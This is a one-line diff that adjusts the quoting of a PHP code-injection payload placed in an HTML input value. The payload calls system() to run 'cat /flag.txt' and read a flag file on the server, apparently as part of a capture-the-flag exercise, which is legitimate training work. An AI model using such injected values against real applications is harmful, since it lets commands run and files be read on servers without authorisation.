@@ -1,1 +1,1 @@
-<input type='text' value='<?php echo system("cat /flag.txt");'>
+<input type='text' value='<?php echo system(\'cat /flag.txt\');'>
